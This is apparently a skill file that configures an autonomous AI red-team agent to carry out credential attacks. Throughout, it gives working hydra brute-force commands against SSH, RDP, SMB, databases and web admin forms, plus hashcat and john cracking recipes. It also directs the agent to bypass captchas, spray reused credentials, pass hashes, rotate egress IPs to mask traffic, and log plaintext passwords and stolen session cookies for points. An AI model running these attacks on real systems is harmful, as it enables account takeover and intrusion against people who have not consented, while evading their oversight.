---
name: credential-attack
description: "Credential attacks: online weak password brute-forcing (hydra) and offline hash cracking (hashcat/john) across SSH/FTP/RDP/SMB/databases/Web admin panels"
whenToUse: "When login portals (Web admin, SSH, FTP, RDP, SMB, MySQL, MSSQL, Redis) are discovered, or when password hashes/ciphertexts are retrieved and require plaintext recovery"
role: exploit
enabled: true
---

# Credential Attacks (Online Brute-Forcing + Offline Cracking)

One of the two most reliable avenues for privilege acquisition in red teaming (the other being plaintext retrieval via configuration or source code disclosure).
**This skill focuses strictly on discovering valid passwords**. Once identified, credentials must be verified via `browser-automation` / `kimi-webbridge`
**by logging into a real browser session** to confirm actual account compromise (Strict rule: credentials alone do not constitute confirmed account access).

## Local Toolkit

| Tool | Path | Version | Purpose |
| --- | --- | --- | --- |
| **hydra** | `/usr/bin/hydra` | 9.7 | Online brute-forcing covering 50+ protocols |
| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | Offline hash cracking (GPU/CPU) |
| **john** | `/usr/sbin/john` | — | Offline cracking (automatic format detection, simple configuration) |

Wordlists: `/usr/share/wordlists/` (including `rockyou.txt` requiring gunzip), `/usr/share/seclists/Passwords/`.
**Extract rockyou if compressed**: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` (fallback to SecLists if authorization is unavailable).

## 1. Online Brute-Forcing (hydra)

### Standard Syntax
```bash
hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [module_parameters] -t <concurrency> -f -o runs/hydra-<target>.txt
```
- `-L` Username wordlist / `-l` Single username; `-P` Password wordlist / `-p` Single password
- `-t` Concurrency (**Default 16; do not exceed 16** to prevent account lockout or IP blocking)
- `-f` Exit immediately upon first hit (avoids account lockouts)
- `-o` Output path under `runs/` (required for audit and reproduction)
- `-V` Verbose output of every attempt (debugging only; disable in production runs)

### Protocol Examples
```bash
# SSH
hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt

# RDP (Strictly enforce low concurrency; Windows enforces aggressive lockout policies)
hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt

# SMB
hydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f

# FTP
hydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 6 -f

# MySQL
hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f

# MSSQL
hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f

# Web Form Login (POST) — Most common
hydra -L users.txt -P pass.txt target.example.com http-post-form \
  "/admin/login.jsp:username=^USER^&password=^PASS^:F=invalid username or password" -t 8 -f -o runs/hydra-web-admin.txt

# Web Form (Custom Headers / HTTPS)
hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 8 -f
```

### Determining Web Form Success / Failure Conditions (Critical)
The third segment of `http-post-form` is formatted as: `"<path>:<POST_body>:<condition>"`. **Condition strings must be strictly validated** to avoid false positives:
- `F=<failure_string>`: The presence of this substring in response indicates **failure** (Recommended, most stable)
- `S=<success_string>`: The presence of this substring indicates **success** (Used when failure responses lack uniform error strings)
- Always send two test requests manually (one with known incorrect password, one with non-existent user) to **confirm the condition string is unique and invariant**.
- Captchas / Graphical verification / Sliders: Investigate bypasses first (static captcha, missing server validation, frontend-only checks). If unbypassable, **do not attempt brute-forcing** (use `browser-automation` for limited interactive attempts) and pivot to alternative vectors.

### Wordlist Prioritization (Efficiency Optimization)
1. **Targeted Micro-Wordlists** (Highest hit rate): Target name / brand / domain / year combinations, e.g. `<Org>@2026`, `Admin@123`, `<domain>2026`; generate from title/organization data in `redteam_asset_query`.
2. **Default Credential Wordlists**: Product factory credentials (`admin/admin`, `tomcat/tomcat`, `weblogic/weblogic1`, `sa/sa`). Check nuclei templates under `http/default-logins/` (307 templates) and **query `redteam_poc_search` first**.
3. **Common Weak Passwords TOP Lists**: `/usr/share/seclists/Passwords/Common-Credentials/` (top 100, 10-million, etc.).
4. Generic mega-wordlists (`rockyou.txt`): Lowest priority due to execution time and noise footprint.

### Sourcing Usernames
- Web Admin Portals: Verbose error strings, JS comments, API responses returning `createBy`, login placeholder hints, `robots.txt`, employee email conventions.
- When `/admin` is discovered via directory fuzzing, prioritize `admin`, `administrator`, `system`, `test`, `guest`.
- When valid credentials are discovered, perform **credential spraying and reuse** immediately.

## 2. Offline Cracking (hashcat / john)

Executing cracking locally on recovered hashes/ciphertexts (from database dumps, config files, `/etc/shadow`, web app storage) produces **zero target-side network traffic**, providing a stealthy approach.

```bash
# 1) Identify hash format
hashcat --identify hashes.txt

# 2) NTLM (Windows)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# 3) NetNTLMv2 (Captured via Responder)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# 4) MD5 / SHA1 (Web applications)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# 5) bcrypt (WordPress / PHP)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# 6) Rule-based mutation (Expand dictionary coverage 10x efficiently)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 7) Mask attack (Known password policy, e.g. 8 characters lowercase + 4 digits)
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
```

```bash
# john: Automatic format detection; configuration in ~/.john/john.conf
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**Note**: When running CPU-only environments without GPU acceleration, `hashcat` execution is resource-constrained. Prioritize rule-based micro-wordlists or offload hash files into `runs/` for offline processing.
**Do not block operational workflows for hours on long-running cracking tasks**; if cracking stalls, leverage raw hashes directly for Pass-the-Hash (see `lateral-movement`).

## 3. Credential Reuse (Prioritize over Brute-Forcing)

Upon obtaining any set of valid credentials, **test horizontally first**:
1. Inspect existing credentials with `redteam_credential_list` (containing usernames, passwords, sources).
2. Spray identical credentials against: sibling installations, associated management portals, SSH/RDP/SMB/database services, VPNs, and management jump boxes.
3. Apply username naming patterns (`first.last`, employee IDs, email prefixes) with known passwords across systems.
4. Reuse raw hashes directly via PtH / Pass-the-Key (see `lateral-movement`).

## 4. Discipline & Boundaries (Mandatory)

1. **Query Database First**: Run `redteam_credential_list` and `redteam_asset_query` to avoid redundant attacks against previously tested targets (investigate targets with `blocked_count > 0` before retrying).
2. **Account Lockout Risks**: Windows (RDP/SMB) and enterprise OA/domain accounts **must strictly enforce rate limits**: `-t 2` (Windows), `-t 4` (SSH/FTP); wordlist sizes should be restricted to tens or low hundreds. **Halt execution after 5 consecutive failures for any single account** to prevent locking out target access channels.
3. **Target Abandonment Threshold**: If a target triggers access blocks > 3 times, mark it as abandoned (`redteam_asset_test` status=abandoned, blocked=true).
4. **Traffic Masking**: Route web form brute-forcing through `cn-proxy-pool` to rotate egress IPs; route internal traffic through established SOCKS tunnels.
5. **Intranet Scans**: For internal network ranges, delegate weak password surveying to `fscan-intranet` (28 service types tested concurrently); reserve hydra for protocols unsupported by fscan or scenarios requiring fine-grained control.

## 5. Output & Ledger Registration (Mandatory)

1. **Immediate Credential Logging via `redteam_credential_add`**:
   - `username`, **plaintext in `secret_value`** (enables immediate dashboard visibility for reuse), `source` (`weak-password` / `default-password` / `credential-reuse` / `leak` / `offline-crack`),
     `tool` (actual executed command string, e.g. `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`), and `secret_ref` (evidence path, e.g. `runs/hydra-ssh-10.0.0.5.txt`).
2. **Authentication Verification Required for Score Claims**: Web management portals must be verified via actual interactive login using `browser-automation` or `kimi-webbridge`
   (open login page -> input credentials -> verify portal access -> record page title/navigation menus/current username -> capture authenticated session cookies) ->
   `redteam_access_add` (`method=web-login`) -> `redteam_score_hit` (`web-app` 10 pts / `web-app` 20 pts, with `evidence` formatted as: "asset | admin portal tomcat/Tomcat@2024").
   **If login fails, log the blocking reason in `redteam_asset_test` under `test`** (unresolved hash / MFA requirement / source IP restriction / account disabled) without claiming score hits.
3. **Service Score Cap Enforcement**: Only one score claim is recognized per service/port. Administrative access achieves maximum points for the target service; do not farm multiple accounts on a single service.
4. Record key events in `redteam_chain_add`: `stage_code=internet` (or `internal`), with `tool` reflecting command line text and `result` summarizing output (e.g. `ssh 10.0.0.5 login success with root/Root@123, uid=0(root)`).
5. All hash files, cracking logs, and output dumps must be saved in `runs/`.
